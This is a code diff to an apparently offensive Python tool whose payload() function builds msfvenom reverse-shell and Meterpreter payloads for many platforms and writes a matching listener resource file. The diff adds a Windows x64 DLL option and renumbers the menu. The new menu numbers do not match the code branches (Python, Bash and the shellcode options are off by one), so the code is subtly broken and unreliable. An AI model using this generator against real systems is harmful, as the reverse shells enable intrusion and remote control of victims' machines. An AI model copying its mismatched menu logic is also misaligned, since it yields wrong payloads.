@@ -444,24 +444,26 @@ def payload():
     """Create msfvenom payload and start a listener."""
     print(
         f"""{choice(color)}
-                      _________________________________________________________
+                      ___________________________________________________________
 
                                    Creating Metasploit Payloads
-         __________________________________________________________________________________
-        |                  |                 |                       |                     |
-        | #Binaries        |  #Web Payloads  |  #Scripting Payloads  |  #Shellcode         |
-        |__________________|_________________|_______________________|_____________________|
-        |                  |                 |                       |                     |
-        | 1) Linux         | 6)  PHP         | 11) Python            | 15) Linux based     |
-        |                  |                 |                       |                     |
-        | 2) Windows (exe) | 7)  ASP         | 12) Bash              | 16) Windows based   |
-        |                  |                 |                       |                     |
-        | 3) Windows (dll) | 8)  JSP         | 13) Perl              | 17) Mac based       |
-        |                  |                 |                       |                     |
-        | 4) Windows (msi) | 9)  WAR         | 14) Ruby              |                     |
-        |                  |                 |                       |                     |
-        | 5) Mac           | 10) Nodejs      |                       |                     |
-        |__________________|_________________|_______________________|_____________________|
+         _______________________________________________________________________________________
+        |                       |                 |                       |                     |
+        | #Binaries             |  #Web Payloads  |  #Scripting Payloads  |  #Shellcode         |
+        |_______________________|_________________|_______________________|_____________________|
+        |                       |                 |                       |                     |
+        | 1) Linux              | 7)  PHP         | 11) Python            | 15) Linux based     |
+        |                       |                 |                       |                     |
+        | 2) Windows (exe)      | 8)  ASP         | 12) Bash              | 16) Windows based   |
+        |                       |                 |                       |                     |
+        | 3) Windows (dll)      | 9)  JSP         | 13) Perl              | 17) Mac based       |
+        |                       |                 |                       |                     |
+        | 4) Windows (dll, x64) | 10) WAR         | 14) Ruby              |                     |
+        |                       |                 |                       |                     |
+        | 5) Windows (msi)      | 11) Nodejs      |                       |                     |
+        |                       |                 |                       |                     |
+        | 6) Mac                |                 |                       |                     |
+        |_______________________|_________________|_______________________|_____________________|
 """
     )
     while True:
@@ -487,56 +489,60 @@ def payload():
     elif ven == "3":
         msfpc_format = "dll"
     elif ven == "4":
+        msfvenom_command = "windows/x64/meterpreter/reverse_tcp"
+        msfvenom_extension = "dll"
+        msfvenom_extra = "-f dll"
+    elif ven == "5":
         msfvenom_command = "windows/meterpreter/reverse_tcp"
         msfvenom_extension = "msi"
-        msfvenom_extra = " -f msi"
-    elif ven == "5":
+        msfvenom_extra = "-f msi"
+    elif ven == "6":
         msfpc_format = "macho"
     # Web Payloads
-    elif ven == "6":
-        msfpc_format = "php"
     elif ven == "7":
-        msfpc_format = "asp"
+        msfpc_format = "php"
     elif ven == "8":
-        msfpc_format = "jsp"
+        msfpc_format = "asp"
     elif ven == "9":
-        msfpc_format = "war"
+        msfpc_format = "jsp"
     elif ven == "10":
+        msfpc_format = "war"
+    elif ven == "11":
         msfvenom_command = "nodejs/shell_reverse_tcp"
         msfvenom_extension = "js"
 
     # Scripting
-    elif ven == "11":
-        msfpc_format = "python"
     elif ven == "12":
-        msfpc_format = "bash"
+        msfpc_format = "python"
     elif ven == "13":
-        msfpc_format = "perl"
+        msfpc_format = "bash"
     elif ven == "14":
+        msfpc_format = "perl"
+    elif ven == "15":
         msfvenom_command = "ruby/shell_reverse_tcp"
         msfvenom_extension = "rb"
 
     # Shellcode
-    elif ven == "15":
+    elif ven == "16":
         msfvenom_command = "linux/x86/meterpreter/reverse_tcp"
         dil = input("Enter language: ")
         if dil.rstrip() == "":
             dil = "raw"
-        msfvenom_extra = f" -f {dil}"
+        msfvenom_extra = f"-f {dil}"
         msfvenom_extension = dil
-    elif ven == "16":
+    elif ven == "17":
         msfvenom_command = "windows/meterpreter/reverse_tcp"
         dil = input("Enter language: ")
         if dil.rstrip() == "":
             dil = "raw"
-        msfvenom_extra = f" -f {dil}"
+        msfvenom_extra = f"-f {dil}"
         msfvenom_extension = dil
-    elif ven == "17":
+    elif ven == "18":
         msfvenom_command = "osx/x86/shell_reverse_tcp"
         dil = input("Enter language: ")
         if dil.rstrip() == "":
             dil = "raw"
-        msfvenom_extra = f" -f {dil}"
+        msfvenom_extra = f"-f {dil}"
         msfvenom_extension = dil
 
     if msfpc_format:
@@ -548,18 +554,16 @@ def payload():
         spawn_shell[-1] = spawn_shell[-1].replace("'", "")
     elif msfvenom_command and msfvenom_extension:
         payload = f'{msfvenom_command.replace("/", "-").replace("_", "-")}-{port}.{msfvenom_extension}'
-        Popen(
-            [
+        with open(os.path.join(os.getcwd(), payload), "wb") as output:
+            command = [
                 "msfvenom",
                 "-p",
                 msfvenom_command,
                 f"LHOST={ipp}",
                 f"LPORT={port}",
-                msfvenom_extra,
-                ">",
-                f'"{payload}"',
             ]
-        )
+            command.extend(msfvenom_extra.split(" "))
+            Popen(command, stdout=output)
         print(f"Payload created: {os.getcwd()}/{payload}")
         msfvenom_rc = f'{msfvenom_command.replace("/", "-").replace("_", "-")}-{port}-{msfvenom_extension}.rc'
         with open(msfvenom_rc, "w") as rc:
